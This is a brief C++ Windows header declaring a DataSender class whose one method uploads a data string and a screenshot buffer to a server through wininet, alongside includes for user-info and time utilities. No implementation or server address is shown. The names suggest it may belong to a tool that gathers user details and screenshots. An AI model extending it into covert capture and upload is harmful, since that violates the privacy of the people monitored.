#pragma once
#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <iostream>
#include "UserInfo.h"
#include "TimeUtils.h"

#pragma comment(lib, "wininet.lib")

class DataSender {
public:
    static void SendDataToServer(const std::wstring& data, const std::vector<BYTE>& screenshotBuffer);
};
